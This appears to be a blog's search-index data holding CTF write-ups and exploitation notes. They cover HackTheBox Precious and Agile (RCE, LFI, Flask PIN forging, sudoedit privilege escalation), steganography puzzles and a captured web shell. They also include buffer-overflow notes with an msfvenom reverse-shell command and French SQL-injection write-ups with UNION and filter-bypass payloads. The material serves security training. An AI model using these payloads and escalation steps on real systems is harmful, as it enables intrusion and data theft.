have trouble finding it. Can you help us ?SetupFirst of all, we need to create a mounting point so that we can mount the raw file on it and being able to read its content. I did the following:sudo losetup -f --show ./suspectDisk.rawsudo mkdir /mnt/THCon23sudo mount /dev/loop0 /mnt/THCon23 The first command returned /dev/loop0 so this is what I used in the last one.Recover Deleted Files [ TestDisk ]Now we need to use TestDisk to read the content of the raw file we just mounted. Just run testdisk and select No Logs.Now you can select your mounted device.Then we can select None. We can see at the bottom that TestDisk advise us to use None.We can now list the content of the mounted device:In the Content directory we can see that there is a LetsDoIt folder that was deleted. We can list its content and we find a folder with the password of the zip it contains:We can now download the zip file using the capital C on it:You can select any folder where you want to save it. I choosed the root folder of my working directory.As we can see, the file was saved using the same tree structure:Finding the flagWhen looking at the tree structure of the zip file once unzipped…We can look for a file with “flag” in it:Well…There are a few… I tried to look if there were a folder or a file with a specific name like .txt file or a file that isn’t a .png file but didn’t find anything. I then wondered… “How is the chall created ???” and I thought that the tree structured was created with all the shitty images and then the flag was put in a specific folder. I then tried to look for the last modified file and: To remove the created folder and the mounted device you can use the following commands: sudo umount /mnt/disk_thcon and sudo losetup -d /dev/loop0." }, { "title": "CTFs | HackTheBox | Machines | Precious", "url": "/CTFs/HackTheBox/Machines/Precious", "categories": "CTFs, HackTheBox, Machines", "tags": "CTF, HackTheBox, Machines, Ruby, CVE", "date": "2023-04-21 00:00:00 +0200", "snippet": "Precious - Machine [Easy]Port EnumerationFirst of all… Let’s do a basic Nmap scan:As we can see, there is nothing interesting… Except the web page that is redirected to http://precious.htb/.We add it to our hosts file and begin the web enumeration.Web EnumerationThe gobuster scan for files and directories didn’t give me anything. The ffuf scan for subdomain didn’t work either…I tried to look for a well-known vulnerability on HTML to PDF for Ruby and I found this CVE-2022-25765 This github repo gives us a beautiful PoC.RCEUsing it as follows gives us a reverse shell syntax to give to the website:And we get a shell:Looking at our home directory, we notice a .bundle folder. Bundler is a popular Ruby gem management tool. This folder contains a cache of all installed gems, along with metadata about the gem version and location. Looking at the config file we get the credentials for Henry.We connect via SSH using what we just found. And now we get the user.txt flag:Priv EscLooking at what we can run as other users, we see that we can execute /opt/update_dependencies.rb file with ruby:This file contains the following code:# Compare installed dependencies with those specified in \"dependencies.yml\"require \"yaml\"require 'rubygems'# TODO: update versions automaticallydef update_gems()enddef list_from_file YAML.load(File.read(\"dependencies.yml\"))enddef list_local_gems Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}endgems_file = list_from_filegems_local = list_local_gemsgems_file.each do |file_name, file_version| gems_local.each do |local_name, local_version| if(file_name == local_name) if(file_version != local_version) puts \"Installed version differs from the one specified in file: \" + local_name else puts \"Installed version is equals to the one specified in file: \" + local_name end end endendThe list_from_file function is called and look for a dependencies.yml file. We look online for ways to inject code in YAML files to execute Ruby code. I found the following blog. I used the Reverse Shell technic they are showing and put it in a dependencies.yml. And…Voilà!!! A root shell:And here is the last flag :)" }, { "title": "CTFs | HackTheBox | Machines | Agile", "url": "/CTFs/HackTheBox/Machines/Agile", "categories": "CTFs, HackTheBox, Machines", "tags": "CTF, HackTheBox, Machines, Flask, CVE, Werkzeug, PIN", "date": "2023-04-19 00:00:00 +0200", "snippet": "Agile - Machine [Medium]Hello there. Today, we are going to look at the Agile room. This was my first medium and I took a lot of time on the foothold for some unknown reason :).Port EnumerationWe first launch a Nmap on the machine and as we can see we have a redirection to http://superpass.htb. So we add it to our /etc/hosts file.Web EnumerationWhen accessing the website for the first time we notice nothing strange. It’s just a basic website.We try to create an account to see what happen and we then can log in with our newly created user. When doing some action on the website as register, login, export… We may encounter server errors like the following:This allows us to know that this run a Flask app in wsgi_app:We notice that there are two main paths. The first one is the Flask path and the other one is the app folder:This will come in handy later.When we connect to the website, we see that it’s basically just a password vault. We can add a user and a website and the password will be automatically generated:When we try to export it, a .csv file is generated. We try to intercept the command in BurpSuite and… We can see that a request is made at /download?fn=a_export_bec55b6381.csv to download a .csv file of the format USER_export_RANDOMCHAR.csvAnother request is then made to the download page stating that the debugger is up:LFIWe may want to try some basic LFI and access the /etc/passwd file:And voilà, we can download any file we want on the machine:Now that we can download any file we want, why not downloading the ones from the website to see if we can find any interesting information. We saw earlier that there was a file that may contain valuable information in /app/app/superpass/app.py and we find a debug function:PIN GeneratorLooking for Flask debugger vulnerabilities on the internet we find a useful link from hacktricks talking about a console that may allow us to get a RCE, but unfortunately, it is not available at /console. But if we are careful enough, we can see that there is a small console icon when we are on an error page:We can click on it but it will ask us for the PIN, that we don’t have…Yet. So basically we need to retrieve all this information:The HackTrick article states that we need to find the user running the app, the value returned by getattr(app, '__name__', getattr (app .__ class__, '__name__')) and the one returned by getattr(mod, '__file__', None) that is the absolute path of app.py.We already found the app name wsgi_app and the path of the app.py is /app/venv/lib/python3.10/site-packages/flask/app.py. So now we need to find the user running the app.We find the website Bangrewell that gives us much more information about how the PIN is generated and how to generate it (which is what we want to do :) ).The article states that we can find the user running the app in the /proc/self/environ file. And after downloading it, we find the user www-data:We can be sure that it is the right user when downloading the /proc/self/status file and see the UID of that user:Now we just need to find the private_bits part. We’ve seen that the first value is generated with the str(uuid.getnode()) function. This is the MAC address of the machine that is converted as an integer. I first tried with the MAC address in the /proc/net/arp but it didn’t work. I then tried with the one of the eth0 interface available in the /sys/class/net/eth0/address file. We then convert it as an INT with python:We now need to recover the second value of the private_bits. Following the Bengrewell steps, we download the /etc/machine-id file and the /proc/self/cgroup and we recover the machine id and the cgroup value superpass.service. /!\\ WARNING /!\\ The machine id may change! So be sure to recover the new one when you restart your machine.We can now run our exploit and recover the PIN: The exploit code is available here if you want but I advise you to create it from scratch with the help of the HackTrick and Bengrewell blog in addition with the source code that you downloaded.RCENow that we have access to the console, we may want to run command in it.We try to recover a reverse shell. I used pearl: You can stabilise your shell with the command python3 -c 'import pty;pty.spawn(\"/bin/bash\")';export TERM=xterm (here we have python3 not python2). Then press CTRL+Z and type stty raw -echo; fg. If nothing is printed out press ENTER and you will get a full shell with autocompletion.Horizontal PrivEscIf you remember, we downloaded the file /proc/self/environ and we found the user with it. But in this file, there was also a configuration file:We can see that there is an SQL username and password to the superpass database:We can now connect to it and see that there is a password table:We can recover the corum password for the machine (Agile) and connect via SSH to have a real shell:We recover the flag:We can’t run anything via sudo, after looking around, I launched Linpeas and we find an interesting process:As we can see, it runs on a local port:So we upload chisel on the machine to be able to look at it on our machine:Now, because it’s a chrome headless browser, we need to open chrome and configure the Discover network targets to be able to get the website on the forwarded port (here 41829):Now add the following line and click on “Done”:You now need to add the test.superpass.htb to your /etc/hosts and put as its IP localhost. This ccould be found from the hosts file on the server or reading the linpeas report.You should see the following appearing. Click on inspect to get a visual on the webpage:Now go to the vault option, and you should see the password for the edwards user:Vertical PrivEscAs edwards we are allowed to run the sudoedit command on two files as the user dev_admin:When looking at what the user dev_admin has access to, we find the following:So we can see that there is a binary on the virtual environment called activate. Looking at all processes either with the Linpeas dump but preferably with PsPy, we can see that it is executed by the root:We find a recent CVE on sudoedit that would allow us to write in a file as dev_admin. We find a blog explaining how to exploit this CVE-2023-22809.First of all, we need to verify that we can write in this script /app/venv/bin/activate and… We do:So we use the following command to write in the activate file and put in it our reverse shell: Note that you can use any editor you want. Nano also worked perfectly.We then put at the beginning our reverse shell:We need to quit the vi editor twice (:wq) and… Voilà !!!:" }, { "title": "CTFs | vishwactf | Quick_Heal", "url": "/CTFs/vishwactf/Stegano/Quick_Heal", "categories": "CTFs, vishwactf", "tags": "CTF, vishwactf, Stegano", "date": "2023-04-03 00:00:00 +0200", "snippet": "This CTF isn’t hard but a bit boring to do. We had a video that, when we launched it, has Morse code in it.We first need to recover the sound of the audio, using any video editor online or not. Then, we can put it in audacity and look at the spectrogram:And now with the spectrogram activated, we can see the Morse code loud and clear:You can use tools like dcode.fr or CyberChef to decode the morse:But this isn’t enough to get the flag. When looking at the video, we can see images that look like part of a QrCode:I recovered all of them and get the following QrCode:This wasn’t good enought because some part of the QrCode wasn’t clean. I used a website to edit QrCode. I choosed the Error Correction Level: as L and the Mask Pattern : as 2 PS: You can find my Photoshop project hereThis gives us the text VishwaCTF{S3cur1ty.S1mpl1f13d we add the previous part of the flag to it and we get the full flag VishwaCTF{S3cur1ty.S1mpl1f13d.5nj0y.c0up0ns}. Don’t forget to add the } at the end. It isn’t displayed in the Morse code." }, { "title": "CTFs | HackDay2023 | Interstellar", "url": "/CTFs/Hackday2023/Stega/Interstellar", "categories": "CTFs, HackDay2023, Interstellar", "tags": "CTF, HackDay2023, Stegano", "date": "2023-03-20 00:00:00 +0100", "snippet": "InterstellarIn this challenge, we have access to a network communication saved in a pcap file.We have just ICMP requests. At first I was thinking about some kind of ping pong challenge but it was not. But when we look at the ICMP packet sent, we can see some interesting stuff.As we can see in the first and last request, we have the PNG header and its trailer that we know because it’s explained on this website.So I created a program that will extract every request and extract the hexadecimal of the image. Unfortunately, I couldn’t manage to recreate the image directly in the python code. But this website allows us to do it.We then download the image and we get the flag:" }, { "title": "CTFs | HackDay2023 | Chunk_of_surprises", "url": "/CTFs/Hackday2023/Stega/Chunk_of_surprises", "categories": "CTFs, HackDay2023, Chunk_of_surprises", "tags": "CTF, HackDay2023, Stegano", "date": "2023-03-20 00:00:00 +0100", "snippet": "Chunk_of_surprisesIn this challenge, we are given a png image. But when we try to open it, we get an error. So we look at the hexadecimal inside the image and we see that the headers and the trailer are not correct.As we can see on this website, the png header should be 89 50 4E 47 0D 0A 1A 0A but is 01 50 4E 47 0D 0A 1A 0A so the first bit is not good.The second header should be IHDR but there is no IHDR so we add it by replacing the wrong hex value. We also modify the tailor as for the PNG header.And we got the flag written in black at the top." }, { "title": "CTFs | HackDay2023 | Astronauts_Poem", "url": "/CTFs/Hackday2023/Stega/Astronauts_Poem", "categories": "CTFs, HackDay2023, Astronauts_Poem", "tags": "CTF, HackDay2023, Stegano", "date": "2023-03-20 00:00:00 +0100", "snippet": "Astronauts_PoemOn this chall, we have a PDF file. When we look at the exif we can see a link to a wiki.When heading to the bottom of the page, we can see two links to old website available on the waybackmachine.We extract the text of the pdf with a tool like pdftotext. When putting the text on the website we get the message: The 10th line is Drove by our curiosity, I found my way: patrolling our spacecraft. You remembered wishes of hope. I am close to.We create a program to count each word length and replace it with the correct brainfuck character as explained on the wiki.After that we get the value &gt;]+9[&gt;]+0+0+0&lt;]-[]&gt;] which gives us 270 in decimal.The NGC 270 is in the constellation of the whale which in French is baleine so the flag is: HACKDAY{baleine}" }, { "title": "CTFs | HackDay2023 | Pas_Trop_Dur", "url": "/CTFs/Hackday2023/Misc/Pas_Trop_Dur", "categories": "CTFs, HackDay2023, Pas_Trop_Dur", "tags": "CTF, HackDay2023, Misc", "date": "2023-03-20 00:00:00 +0100", "snippet": "Pas_Trop_DurIn this chall, we are given a Wireshark communication and the goal is to find the password used by the hacker on its malicious file.When we filter the HTTP packet we can see a “maliciouswebshell.php”.When we try to download it, we get a lot of unprintable characters:We see a lot of strings that look like base64, but… aren’t the == supposed to be at the end ?Using the basic regex \"[=0-9a-zA-Z]+\" on your favourite code editor you can recover all the base64 strings. This regex means that I am looking for every string that is between quotes and that contain at least one character that should be a letter (upper or lower case), a number or an equal sign (the “+” means “at least once”).You can save the result in a file and remove every quote. Then you can use the linux command cat yourfile | rev | base64 -d &gt; maliciouswebshell.php. This will save the web page source code in the “maliciouswebshell.php”. We first need to reverse the string (rev command) because the we noticed that the == was at the beginning but in base64 they should be at the end.You can find the file here.Now that we have the code we need to understand it. We can host it locally with the php command php -S localhost:8080The form sends itself (onsubmit=\"return login(this)\") to the login function. We now check this function. This function directly call the addEncKey function. The code of the function is the following:\t\tfunction addEncKey(form){\t\t\tvar encKey = document.createElement(\"input\");\t\t\tencKey.type = \"hidden\";\t\t\tpref = ENCKEY.substr(0, PRELEN);\t\t\tencKey.name = pref.split(\"\").reverse().join(\"\") + pref;\t\t\tencKey.value = btoa(ENCKEY);\t\t\tform.appendChild(encKey);\t\t\treturn form;\t\t}What we need to understand is that it gives the field name pref and its reverse. So encKey.name is just a palindrome and the encKey.value is a base64 of ENCKEY which was at first base64 decoded, so we have in it the initial value that you can find at the top of the file.After that, the login function calls the setValue and setName. We are just going to look at the value because it is what we are inputting.\t\tfunction setValue(str){\t\t\treturn btoa(xorStr(str));\t\t}So this is not a big function and it only xor the string and base64 encode it. There is a getValue function in the file so we don’t need to reinventing the wheel. Now is we try to intercept the request with burp, wen we send the string a we have the result Lg==.So we know that we can reverse this value with the getValue function. To do that, we can use the console of our browser (press F12 &gt; Console).Now that we know how to reverse a given string we need to find the password the hacker used. Getting back to Wireshark, when we inspect the TCP of the penultimate maliciouswebshell.php we can find the cookies like before. The first one of these packets is not the good one but the second one gives us the password:The flag was HACKDAY{Wabbajack12345678}." }, { "title": "Notes | Reverse | BOF", "url": "/Notes/Reverse/BOF", "categories": "Notes, Reverse, BOF", "tags": "Reverse, BOF", "date": "2022-12-07 00:00:00 +0100", "snippet": "Buffer OverflowFrom here I’m assuming that you already know a bit about ASM (mov, call, lea…). If you don’t there is a good introduction in here.So basically, the buffer overflow attack appears when you don’t pay attention to the user input and that he gives you a greater input than what you expected. This surplus will overwrite the memory.We need to keep in mind the endianness of the system. If for example, we have a word \\xAA\\xBB\\xCC\\xDD at the address 0xffff0000, then depending on the endianness the word will be read differently : Memory Address 0xffff0000 0xffff0001 0xffff0002 0xffff0003 Big-Endian AA BB CC DD Little-Endian DD CC BB AA What we would like to do is to give a greater input than the one expected so that we overwrite the return address of the program. Thanks to that, we will be able to call another function or something else in the memory. Here is an image that shows basically what we want to do :At first, we will try to find the main function and its address. For that, we can use gdb or radare2. I will continue this explanation using gdb syntax but it is basically the same on r2. We will run the program until we get to the input part, when we get there we can input a large number of A and if we inputed enought A, we should get a :Program received signal SIGSEGV, Segmentation fault.0x41414141 in ?? ()The 41 are the hexadecimal value of A. Now that we know that we overwrote the return address we need to find how much A we need to input before getting a segmentation fault. We can use the pattern_offset tool of metasploit to generate a random string of certain length so we don’t have a bunch of 41 in the memory. We can use it as follows:pattern_create.rb -l 1200 This program should be in the metasploit-framework folder. On my computer it is located at /usr/share/metasploit-framework/tools/exploit/pattern_create.rb.We can use the gdb command to find the address of EIP (respectively RIP depending on the architecture) :info registers eipWith this information you can use the metasploit pattern_offset.rb tool to find the exact offset. Or if you are good in ASM you can look what is the length of the word you give in input. You can use the tool as follows (where 0xaabbccdd is the value storred in EIP that you found earlier):pattern_offset.rb -q 0xaabbccdd You can find pattern_offset.rb in /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb.We will assume that we have an offset of 64 for the rest of the demonstration. Now we can run the program again with the offset length as input and 4 bytes of “B”s. 4 is the size of the return address (here in 32 bi ELF). Here is an example:\"A\" * 64 + \"B\"*4You can use this python command to generate your strings:python2 -c \"print 'A' * 64 + 'B' * 4\" This command only works in python2. You can use the following command in python3 : python3 -c \"print('A' * 64 + 'B' * 4)\" You may need gdb-peda for this kind of command. You can find it here or hereWith this input we should only have the 4 “B”s as EIP address like:Program received signal SIGSEGV, Segmentation fault.0x42424242 in ?? ()For this first part of BOF, we will use msfvenom. To create a reverse shell payload, we can use the following command:msfvenom -p linux/x86/shell_reverse_tcp LHOST=IP lport=PORT --platform linux --arch x86 --format python Don’t forget to replace IP with yours. Same for the PORT.Now if this is too long you can change it to a simple shell instead of a reverse one.The composition of our final payload will be:Buffer = \"C\" * (64 - 10 - 40 - 4) = 10NOPs = \"\\x90\" * 10Shellcode = \"A\" * 40EIP = \"B\" * 4 \\x90 is the hexadecimal value of the NOP instruction.Bad CharactersYour payload may not work because of some Bad Characters. They are generaly \\x00 (Null byte),\\x0A (Line Feed),\\x0D (Carriage Return),\\xFF (Form Feed).Here is the list of all chars from \\x00 to \\xFF:\"\\x00\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\"You can remove the NOPs and the shellcode from the previous payload and replace them by this list. If the list is too long (256 chars) you can do it multiple time with different parts of the list. Now you can set a breakpoint just after the input so that we can analyse the memory. When the program hits the breakpoint, we can look at the EIP like that x/2000xb $esp+500. We will see a bunch of 0x43 (our “C”s). At the end of our “C”s we should see the characters of our previous list. If a character isn’t printed out, it means that it is a bad character. You can repeat those steps until you removed all the bad characters. Don’t forget to change the number of “C”s when you remove a bad character from the list. The number of “C”s should increase by one each time you remove a bad character.You can now use the previous msfvenom command specifying all bad characters:msfvenom -p linux/x86/shell_reverse_tcp lhost=IP lport=PORT --arch x86 --platform linux --format python --bad-chars \"\\x00\\x09\\x0a\"Identification of the Return AddressNow we should replace our 4 “B”s by the address of our shellcode. For that we need to analyse the memory. We can do so like:x/2000xb $esp+1400We will see where our NOPs (0x90) end and where our shellcode begins. For example, if the NOPs end at 0xffffaabb, then we will replace our 4 “B”s by \\xbb\\xaa\\xff\\xff. To be more accurate we can choose an address that is full of NOP a bit before 0xffffaabblike 0xffffaaaa for example.ROP chain attackA ROP (Return-Oriented Programming) chain is a technique used in exploitation of memory safety vulnerabilities, where an attacker controls the flow of execution by chaining together small code snippets (gadgets) found within the program itself or its libraries.The attacker constructs a ROP chain by overwriting the return address of a function with the address of a ROP gadget, which performs some actions (such as setting up a register or stack) before returning to the next gadget in the chain. The attacker repeats this process until the final gadget transfers control to the attacker’s payload (such as executing shellcode).You can find here a code for a basic ROP chain attack. As you can see, I used as offset 0x40+4. The 0x40 can be found in the code using gdb here add esp,0x4 and the +4 is because of the file is a ELF 32-bit format. To know if the file is either a 32 or 64 bit ELF executable you can use the file Linux command like:file VULN_EXECUTABLEYou can find the system call and the address of /bin/sh by using the search command like search /bin/sh or by using info proc mapping to print the range of addresses of your program and the libc. After using the info proc mapping, you can use the find command as follows find 0xf7c00000, 0xf7e22000, \"/bin/sh\". The two addresses you see are the range of addresses where we want to search the /bin/sh. It may be better to look only on addresses of the program and after that, only on the libc addresses. Searching in both range of addresses may cause errors. You may need to use return to libc to recover those addresses if the program uses Data Execution Prevention (DEP) and Address Space Layout Randomization (ASLR).You can also look at this really great video of John Hammond about ROP chain attack. He explains more in detail how to use the return to libc." }, { "title": "CTFs | HackDay | J'ai perdu le flag English", "url": "/CTFs/HackDay/Stegano/J_ai_perdu_le_flag_English", "categories": "CTFs, HackDay, J'ai perdu le flag", "tags": "CTF, HackDay, Stegano", "date": "2022-11-07 00:00:00 +0100", "snippet": "WriteUp CTF HackDay : J’ai perdu le flagWe start this challenge with a johnnix folder and a zip johnHacked.zip as shown below.The zip is protected by a password. So we go to the johnnix folder which contains a lot of text files. The text files don’t seem to be important except for some base64 encoded strings.In this folder there is an image of the logo of the event. So we go to aperisolve. We are told that the image contains a Readme file. We extract it with steghide without using passwords.The text is available here.I feel like the challenge is in two parts, OSINT and retrieving the words from each file. I start a quick search for this john nix without success. So I create a script to retrieve the first word of line 24 of the following files :682910xecoz537w3zly33pu3ow02q3r772i64pvpe63999u6ov4n2p2b0448gpzn49n68ktas0402fkz90adazd1The result is as follows:I have the impression that we’ll have to go back to doing OSINT.At the end of the file, there is the name and surname of the person who wrote the file, but also his email mailto@john.nix@gmx.fr.So I send an e-mail to dear John and …. gets an automatic answer:Instagram and LinkedIn links don’t work… But the Twitter does!We go to the mega link and download a “.wav” file.My first reflex (after listening to this sweet melodious sound) is to use sonic visualizer which is very useful for audio CTF challenges. We add a spectrogram and … taddaaaaa :The zip password… or not. In fact, it is the name of a file. We go to the 24th line of the file and the first word is :For this part the [CyberChef](https://gchq.github.io/CyberChef/) tool can help.This text is obviously base 64 encoded which gives us once decoded : \\```74 97 68 111 82 101 76 97 83 116 101 103 97 110 111 35 109 108 36 49 36 102 101 56 99 101 55 54 97 53 49``` This new text is obviously base 10 encoded which gives us once decoded : ```JaDoReLaStegano#ml$1$fe8ce76a51```Bingo the password of the zip!We unzip it and we get ... 19 new images.I put the 1st one in aprerisolve and there is a file that can be extracted with steghide without password, same for the 2nd and the 3rd...I create a script to automate all this and ... back to square one. Texts, an image of Rick and a readme which says to us:Hey ! Tu y es presque …Encore un peu de recherche :)🎶 NEVER GONNA GIVE YOU UP 🎶 🎶 NEVER GONNA LET YOU DOWN 🎶```I put the image ImRick.jpg in aperisolve and … it contains another file (fkz90adazd1_) containing the string: fnB0Jnh7Kkx0K3doekllY2JwREhfPUNOAgain base64 which gives us : ~pt&amp;x{*Lt+whzIecbpDH_=CNThe tool dcode can be useful for this part.I try to find the encoding of this string and the ROT47 gives us a rather satisfactory result : OAEUILY{EZH9Kx643Asw0lr}Well, it’s not the flag but it looks like it.From there we have two options: We have already decoded the base64 strings of the previous files containing the false flags We haven’t done itIf we have done it we see that the false flags are of the form HackFlag[xxx]. We test to decode with vigenère and the key HACKFLAG and … END. We have the flag.Otherwise we can guess it. We test for example the key HACKDAY and we obtain : HACKFLA{XZF9Au643Aup0lp}From there, either we brute force the key of the form HACK** or we use *HACKFLA and … END… ah no the flag HACKDAY{XZF9As643Psp0lp} does not work. After a little thought we try HACKFLAG and then we have the right flag." }, { "title": "CTFs | HackDay | J'ai perdu le flag French", "url": "/CTFs/HackDay/Stegano/J_ai_perdu_le_flag_French", "categories": "CTFs, HackDay, J'ai perdu le flag", "tags": "CTF, HackDay, Stegano", "date": "2022-11-07 00:00:00 +0100", "snippet": "WriteUp CTF HackDay : J’ai perdu le flagOn commence ce challenge avec un dossier johnnix et un zip johnHacked.zip comme montré ci-dessous.Le zip est protégé par un mot de passe. On se rend donc dans le dossier johnnix qui contient un grand nombre de fichiers texte. Les fichiers texte n’ont pas l’aire d’être important en soit excepté certaines chaines encodées en base64.Dans ce dossier il y a une image du logo de l’épreuve. On se rend donc sur aperisolve. On nous dit que l’image contient un fichier Readme. On l’extrait donc avec steghide sans utiliser de mots de passe.Le texte est disponible ici.J’ai l’impression que le challenge se découpe en deux parties, OSINT et récupération des mots de chaque fichier. Je commence une recherche rapide de ce john nix sans succès. Je crée donc un scripte pour récupérer le premier mot de la ligne 24 des fichiers suivants :682910xecoz537w3zly33pu3ow02q3r772i64pvpe63999u6ov4n2p2b0448gpzn49n68ktas0402fkz90adazd1Le résultat est le suivant :J’ai comme l’impression qu’on va devoir retourner faire de l’OSINT .À la fin du fichier, il y a le nom et prénom de la personne qui a écrit le fichier, mais aussi son mail mailto@john.nix@gmx.fr.J’envoie donc un mail à ce cher John et …. obtiens une réponse automatique :Les liens Instagram et LinkedIn ne fonctionnent pas… Mais le Twitter oui !On se rend sur le lien mega et on télécharge un fichier “.wav”.Mon premier réflexe (après avoir écouté ce doux son mélodieux) est d’utiliser sonic visualizer qui est très utile pour les challenges de CTF audio. On ajoute un spectrogramme et … taddaaaaa :Le mot de passe du zip… ou pas. En fait, c’est le nom d’un fichier. On se rend à la 24e ligne de ce dernier et le premier mot est :Pour cette partie l'outil [CyberChef](https://gchq.github.io/CyberChef/) peut aider.Ce texte est évidemment de la base 64 ce qui nous donne une fois décodé :\\```74 97 68 111 82 101 76 97 83 116 101 103 97 110 111 35 109 108 36 49 36 102 101 56 99 101 55 54 97 53 49``` Ce nouveau texte est en base 10 ce qui nous donne une fois décodé :```JaDoReLaStegano#ml$1$fe8ce76a51```Bingo le mot de passe du zip !On le décompresse et on obtient ... 19 images.Je mets la 1ere dans aprerisolve et il y a un fichier que l'on peut extraire avec steghide sans mot de passe, idem pour la 2e et la 3e...Je crée un script pour automatiser tout ça et ... retour à la case départ. Des textes, une image de Rick et un readme qui nous dit :Hey ! Tu y es presque …Encore un peu de recherche :)🎶 NEVER GONNA GIVE YOU UP 🎶 🎶 NEVER GONNA LET YOU DOWN 🎶```Je mets l’image ImRick.jpg dans apérisolve et … elle contient un autre fichier (fkz90adazd1_) contenant la chaine : fnB0Jnh7Kkx0K3doekllY2JwREhfPUNOEncore de la base64 qui nous donne : ~pt&amp;x{*Lt+whzIecbpDH_=CNL’outil (dcode)[https://www.dcode.fr/identification-chiffrement] peut être utile pour cette partie.J’essaye de trouver l’encodage de cette chaine et le ROT47 nous donne un résultat plutôt satisfaisant : OAEUILY{EZH9Kx643Asw0lr}Bon ce n’est pas le flag mais ça y ressemble.De là on a deux options : On a déjà décodé les chaines en base64 des fichiers précédent contenant les faux flags On l’a pas faitSi on l’a fait on voit que les faux flags sont de la forme HackFlag[xxx]. On test de décoder avec vigenère et la clé HACKFLAG et … FIN. On a le flag.Sinon on peut le deviner. On test par exemple la clé HACKDAY et on obtient : HACKFLA{XZF9Au643Aup0lp}De là, soit on bruteforce la clé de la forme HACK** soit on utilise *HACKFLA et … FIN… ah non le flag HACKDAY{XZF9As643Psp0lp} ne marche pas. Après un peu de réflexion on essaye HACKFLAG et là on a le bon flag." }, { "title": "CTFs | 404CTF | Web | Le braquage | Rencontres", "url": "/CTFs/404CTF/Web/Le_braquage/Rencontres", "categories": "CTFs, 404CTF, Web, Rencontres", "tags": "404CTF, Web", "date": "2022-11-07 00:00:00 +0100", "snippet": "RencontresNous devons ici faire face à certain filtres. Le SELECT et les espaces ne sont pas autorisé par exemple.En faisant un peut de recherche on tombe sur le site de PortSwigger.Nous trouvons en bas de la page comment faire pour qu’il n’y ai pas d’espaces dans la commande (utilisation de /**/) et remplaçons le SELECT par %53%45%4c%45%43%54. Ce qui nous donne : '/**/UNION/**/%53%45%4c%45%43%54/**/1,2,schema_name/**/from/**/INFORMATION_SCHEMA.SCHEMATA/**/#On se dirige vers la base de donnée RencontreVendeurs ('/**/UNION/**/%53%45%4c%45%43%54/**/1,TABLE_NAME,TABLE_SCHEMA/**/from/**/INFORMATION_SCHEMA.TABLES/**/where/**/table_schema='RencontreVendeurs'#) :Nous n’avons plus qu’à récupérer les informations de la table password et de la table date.Commençons par la table password (même étaps que pour la partie 2 mais avec le filtres):Il ne nous reste plus que la table Rdv :Nous avons maintenant tout ce qu’il nous faut." }, { "title": "CTFs | 404CTF | Web | Le braquage | Informations", "url": "/CTFs/404CTF/Web/Le_braquage/Informations", "categories": "CTFs, 404CTF, Web, Informations", "tags": "404CTF, Web", "date": "2022-11-07 00:00:00 +0100", "snippet": "InformationsIl nous est suggéré d’utiliser ici les UNION. On cherche donc le nombre de champs pour l’injection et on trouve :On cherche le nom de la base de données avec schema_name de la table INFORMATION_SCHEMA.SCHEMATA (UNION SELECT 1,schema_name from INFORMATION_SCHEMA.SCHEMATA -- -).On obtient deux bases de données :On se concentre maintenant sur la base de données UnionVendeurs. On cherche les tables qu’elle contient (' UNION select TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.TABLES where table_schema='UnionVendeurs' -- -):La table Users semble être la plus intéressante. Mais nous ne connaissons pas le nom des colonnes (' UNION select COLUMN_NAME,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS where table_name='Users' -- -):On récupère le nom et le prénom UNION select nom, prenom from Users -- -:Nous pouvons passer à la dernière étape." }, { "title": "CTFs | 404CTF | Web | Le braquage | Discussions", "url": "/CTFs/404CTF/Web/Le_braquage/Discussions", "categories": "CTFs, 404CTF, Web, Le braquage", "tags": "404CTF, Web", "date": "2022-11-07 00:00:00 +0100", "snippet": "DiscussionsDans ce challenge il s’agit simplement d’utiliser le OR pour outrepasser l’authentification :On obtient donc le numéro de téléphone et l’adresse postale :On passe à la deuxième étape." }, { "title": "CTFs | 404CTF | Web | Le braquage", "url": "/CTFs/404CTF/Web/Le_braquage", "categories": "CTFs, 404CTF, Web", "tags": "", "date": "2022-11-07 00:00:00 +0100", "snippet": "Le braquageVoici la consigne :Ce CTF sur les SQLi est divisé en trois partie : Discussions Informations Rencontres" }, { "title": "CTFs | 404CTF | Fiché JS", "url": 